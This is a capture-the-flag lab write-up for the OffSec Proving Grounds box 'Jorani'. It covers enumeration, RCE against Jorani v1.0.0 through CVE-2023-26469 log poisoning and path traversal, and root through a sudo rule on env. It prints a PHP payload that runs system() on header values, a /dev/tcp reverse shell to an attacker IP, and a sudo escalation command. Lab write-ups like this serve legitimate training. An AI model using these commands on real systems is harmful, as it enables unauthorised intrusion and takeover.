
## Overview

**Platform:** OffSec Proving Grounds **Operating System:** Linux (Ubuntu) **Web Application:** Jorani (leave management system) v1.0.0 **Initial Access:** Log poisoning + path traversal RCE (CVE-2023-26469) **Initial Access Type:** Web application exploitation **Privilege Escalation:** Sudo NOPASSWD rule on `/usr/bin/env` **Final Access:** Root

### Key Techniques

- Default Apache page recognition as a signal to dig deeper
- gobuster directory brute-forcing
- Redirect-following to identify the real application (Jorani)
- CVE lookup from app + version
- Public PoC usage (log-poisoning RCE)
- Reverse shell upgrade from a PoC-provided pseudo-shell
- TTY stabilization (`pty.spawn`)
- `sudo -l` enumeration
- GTFOBins `env` sudo abuse

---

# Attack Path

```text
Nmap: 80 (default Apache page)
        ↓
gobuster Directory Fuzzing
        ↓
307 Redirects → /session/login
        ↓
Jorani Identified (v1.0.0)
        ↓
CVE-2023-26469 (Log Poisoning + Path Traversal RCE)
        ↓
Public PoC Poisons Log File, Traverses to It, Triggers PHP
        ↓
Pseudo-Shell via PoC
        ↓
Upgrade to Full Reverse Shell
        ↓
Shell as jordak
        ↓
sudo -l: NOPASSWD on /usr/bin/env
        ↓
GTFOBins env Technique
        ↓
Root Shell
```

---

# 1. Nmap Enumeration

```bash
nmap <target>
```

```text
80/tcp  http  Apache 2.4.58 (Ubuntu) — "Apache2 Ubuntu Default Page: It works"
```

The default Apache landing page doesn't reveal an application by itself.

> [!tip] Recognition Pattern A default "It works" Apache page is not a dead end — it just means the real application lives under a specific path rather than the web root. Always follow up with directory brute-forcing rather than assuming the box has nothing on port 80.

---

# 2. Directory Enumeration

```bash
gobuster dir -u http://<target>/ -w /usr/share/wordlists/SecLists-master/Discovery/Web-Content/common.txt
```

Multiple `307` redirects found. Following one leads to:

```text
/session/login
```

This identifies the running application as **Jorani** — an open-source leave/time-off management system.

> [!tip] Recognition Pattern `307` (or other redirect) status codes in a directory brute-force are worth following manually, not just noting — the redirect target itself is often what identifies the actual application, especially when the web root shows only a generic default page.

---

# 3. Vulnerability Identification

Searching for the Jorani version surfaces **CVE-2023-26469** — a vulnerability in Jorani v1.0.0 leading to command execution.

- Public PoC: [Orange-Cyberdefense/CVE-repository — CVE_Jorani.py](https://github.com/Orange-Cyberdefense/CVE-repository/blob/master/PoCs/CVE_Jorani.py)

**How the vulnerability works, per the PoC's own output:**

1. Obtains a session cookie.
2. "Poisons" a log file by causing a malicious PHP snippet to be written into it — the payload checks for a custom HTTP header and, if present, base64-decodes and executes its value via `system()`:
    
    ```php
    <?php if(isset($_SERVER['HTTP_<HEADER>'])){system(base64_decode($_SERVER['HTTP_<HEADER>']));} ?>
    ```
    
3. Uses a **path traversal** to reach that log file through a URL that PHP will actually execute (rather than just serve as text), turning the poisoned log into a live PHP file.
4. Sends the custom header with a base64-encoded command as its value, triggering execution.

> [!tip] Key Principle This is the classic **log poisoning** pattern: get attacker-controlled text (here, PHP code) written into a file the application logs to, then find a way to have that file _executed_ rather than just stored — usually via path traversal to reach it through the PHP interpreter, or via a wrapper. The header-based payload trigger is a nice detail: it keeps the "poisoned" log content dormant (harmless as inert text) until a specific header is sent, which also makes it slightly less likely to be noticed by casual log review.

---

# 4. Exploitation

```bash
python3 CVE_Jorani.py http://<target>
```

The PoC handles session setup, log poisoning, path traversal, and payload triggering automatically, dropping into a pseudo-terminal:

```text
jrjgjk@jorani(PSEUDO-TERM)
$ whoami
jordak
```

## Upgrading to a full reverse shell

```bash
rlwrap nc -lvnp 443
```

From within the PoC's pseudo-shell:

```bash
bash -c "bash -i >& /dev/tcp/<attacker_ip>/443 0>&1"
```

Full interactive-ish shell received as `jordak`.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

```bash
cat /home/jordak/local.txt
```

> [!tip] Recognition Pattern A PoC's own built-in shell (pseudo-terminal, limited command execution) is usually worth immediately upgrading to a real reverse shell the moment it works — PoC shells are often fragile, non-interactive, or missing job control, and a proper reverse shell plus `pty.spawn` gives a much more usable working environment for enumeration.

---

# 5. Privilege Escalation

```bash
sudo -l
```

```text
User jordak may run the following commands on jordak:
    jordak ALL=(ALL) NOPASSWD: /usr/bin/env
```

`env` is [documented on GTFOBins](https://gtfobins.github.io/gtfobins/env/) as a sudo-privesc vector — since `env` is designed to run an arbitrary program with a modified environment, permitting it via sudo effectively permits running _anything_.

```bash
sudo /usr/bin/env /bin/bash
```

```bash
id
whoami
# root
```

```bash
cat /root/proof.txt
```

> [!tip] Key Principle `env` (like `find`, `awk`, `less`, `vim`, and many others on GTFOBins) is a "helper" utility whose entire job is to invoke another program — any such utility permitted via sudo, regardless of how mundane it looks, should be checked against GTFOBins before assuming it's harmless. `env <command>` is one of the simplest possible sudo-bypass patterns: sudo only restricts _which binary_ you can invoke directly, not what that binary does once running, and `env`'s whole purpose is to launch something else.

---

# Recognition Patterns

|Observation|Investigate|
|---|---|
|Default Apache/web-server landing page|Directory brute-force before assuming there's nothing there|
|Redirect status codes (`301`/`302`/`307`) in a directory scan|Follow them — the redirect target often identifies the real application|
|App + exact version identified|Search CVEs immediately|
|A PoC drops into its own limited shell|Upgrade to a full reverse shell right away rather than working inside the PoC's shell|
|`sudo -l` shows a "helper" utility (`env`, `find`, `awk`, etc.)|Check GTFOBins — these routinely allow running arbitrary commands|

---

# Key Lessons

> [!tip] A Default Web Page Is Not a Dead End Always follow up with directory/content discovery — the real application is often one path away from a generic default landing page.

> [!tip] Follow Redirects During Directory Enumeration Redirect responses (307 here) can be the fastest way to identify the actual running application when the web root itself gives nothing away.

> [!tip] Log Poisoning + Path Traversal Is a Reusable RCE Pattern Writing attacker-controlled code into a log file, then reaching it through a path that causes the interpreter to execute it rather than serve it as text, shows up across many different apps. Recognize the shape even when the specific vulnerable endpoint differs.

> [!tip] Upgrade PoC Shells Immediately A proof-of-concept's own shell is a means to an end — swap to a real reverse shell (and stabilize with `pty.spawn`) as soon as it's viable, rather than trying to work within a limited PoC-provided interface.

> [!tip] Any Sudo-Permitted "Helper" Binary Deserves a GTFOBins Check `env`, and utilities like it, exist specifically to launch other programs — permitting them via sudo is functionally close to permitting anything.